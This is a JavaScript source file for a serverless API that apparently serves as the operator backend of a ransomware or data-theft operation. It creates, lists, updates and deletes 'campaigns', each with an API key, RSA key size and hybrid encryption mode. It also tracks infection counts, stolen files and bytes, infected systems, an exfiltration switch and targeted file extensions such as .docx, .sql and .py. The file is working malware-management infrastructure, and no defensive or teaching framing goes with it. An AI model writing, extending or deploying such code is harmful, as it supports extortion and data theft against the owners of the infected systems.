// vercel-dashboard/api/campaigns/index.js
// Campaign/Key Management API

import { kv } from '@vercel/kv';

export default async function handler(request, response) {
  // CORS
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();

  try {
    switch (request.method) {
      case 'GET':
        return await handleGet(request, response);
      case 'POST':
        return await handlePost(request, response);
      case 'PUT':
        return await handlePut(request, response);
      case 'DELETE':
        return await handleDelete(request, response);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Campaigns API error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

// GET /api/campaigns - List all campaigns
async function handleGet(request, response) {
  const { id, includeStats } = request.query;

  if (id) {
    // Single campaign
    const campaign = await kv.get(`campaign:${id}`);
    if (!campaign) return response.status(404).json({ error: 'Campaign not found' });

    if (includeStats === 'true') {
      const stats = await kv.hgetall(`campaign:${id}:stats`);
      const systems = await kv.smembers(`campaign:${id}:systems`) || [];
      campaign.stats = stats || {};
      campaign.systemCount = systems.length;
      campaign.systems = systems.slice(0, 50); // Preview
    }
    return response.json(campaign);
  }

  // List all campaigns
  const campaignIds = await kv.smembers('global:campaigns') || [];
  const campaigns = [];

  for (const cid of campaignIds) {
    const c = await kv.get(`campaign:${cid}`);
    if (c) {
      const stats = await kv.hgetall(`campaign:${cid}:stats`);
      const systemCount = (await kv.scard(`campaign:${cid}:systems`)) || 0;
      campaigns.push({
        id: c.id,
        name: c.name,
        apiKey: c.apiKey,
        createdAt: c.createdAt,
        status: c.status,
        stats: {
          totalInfections: parseInt(stats?.totalInfections || '0'),
          totalFiles: parseInt(stats?.totalFiles || '0'),
          totalBytes: parseInt(stats?.totalBytes || '0'),
          lastActivity: stats?.lastActivity
        },
        systemCount
      });
    }
  }

  // Sort by last activity
  campaigns.sort((a, b) => new Date(b.stats.lastActivity || 0) - new Date(a.stats.lastActivity || 0));

  response.json({ campaigns, total: campaigns.length });
}

// POST /api/campaigns - Create new campaign
async function handlePost(request, response) {
  const { name, description, apiKey, rsaKeySize = 4096 } = request.body;

  if (!name) return response.status(400).json({ error: 'Campaign name required' });

  const id = `camp_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  const generatedApiKey = apiKey || `ck_${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 10)}`;

  const campaign = {
    id,
    name,
    description: description || '',
    apiKey: generatedApiKey,
    rsaKeySize,
    status: 'active',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    settings: {
      exfilEnabled: true,
      encryptionMode: 'Hybrid',
      maxFileSizeMB: 50,
      targetExtensions: ['.txt', '.doc', '.docx', '.pdf', '.sql', '.json', '.cs', '.py', '.js']
    }
  };

  // Generate RSA keys if needed
  // Note: In production, generate keys securely and store private key encrypted
  // For now, we'll store a placeholder
  campaign.keyPlaceholder = true;

  await Promise.all([
    kv.set(`campaign:${id}`, campaign),
    kv.sadd('global:campaigns', id),
    kv.hset(`campaign:${id}:stats`, {
      totalInfections: 0,
      totalFiles: 0,
      totalBytes: 0,
      createdAt: campaign.createdAt
    })
  ]);

  response.status(201).json(campaign);
}

// PUT /api/campaigns - Update campaign
async function handlePut(request, response) {
  const { id, ...updates } = request.body;
  if (!id) return response.status(400).json({ error: 'Campaign ID required' });

  const existing = await kv.get(`campaign:${id}`);
  if (!existing) return response.status(404).json({ error: 'Campaign not found' });

  const updated = {
    ...existing,
    ...updates,
    id, // Prevent ID change
    updatedAt: new Date().toISOString()
  };

  await kv.set(`campaign:${id}`, updated);
  response.json(updated);
}

// DELETE /api/campaigns - Delete campaign
async function handleDelete(request, response) {
  const { id } = request.query;
  if (!id) return response.status(400).json({ error: 'Campaign ID required' });

  const existing = await kv.get(`campaign:${id}`);
  if (!existing) return response.status(404).json({ error: 'Campaign not found' });

  // Clean up all associated data
  const systems = await kv.smembers(`campaign:${id}:systems`) || [];
  const cleanup = [
    kv.del(`campaign:${id}`),
    kv.del(`campaign:${id}:stats`),
    kv.del(`campaign:${id}:systems`),
    kv.srem('global:campaigns', id)
  ];

  // Clean up system associations
  for (const sysId of systems) {
    cleanup.push(kv.srem(`system:${sysId}:campaigns`, id));
  }

  await Promise.all(cleanup);
  response.json({ success: true, deleted: id });
}